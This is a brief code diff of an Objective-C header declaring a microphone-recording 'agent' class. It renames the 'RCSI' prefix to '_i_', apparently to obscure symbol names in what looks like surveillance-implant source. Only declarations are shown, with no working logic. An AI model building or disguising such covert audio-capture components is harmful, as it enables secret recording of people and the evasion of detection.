@@ -18,19 +18,19 @@
 #import "RCSIMicrophoneRecorder.h"
 
 
-@interface RCSIAgentMicrophone : RCSIAgent <Agents>
+@interface _i_AgentMicrophone : _i_Agent <Agents>
 {
 @private
   BOOL                 mIsRunning;
 
 @private
-  RCSIMicrophoneRecorder *mRecorder;
+  _i_MicrophoneRecorder *mRecorder;
   BOOL                    mPlaybackWasInterrupted;
   BOOL                    mPlaybackWasPaused;
   CFStringRef             mRecordFilePath;
 }
 
-@property (readonly)          RCSIMicrophoneRecorder *mRecorder;
+@property (readonly)          _i_MicrophoneRecorder *mRecorder;
 @property (readonly)          BOOL                    mIsRunning;
 @property                     BOOL                    mPlaybackWasInterrupted;
 
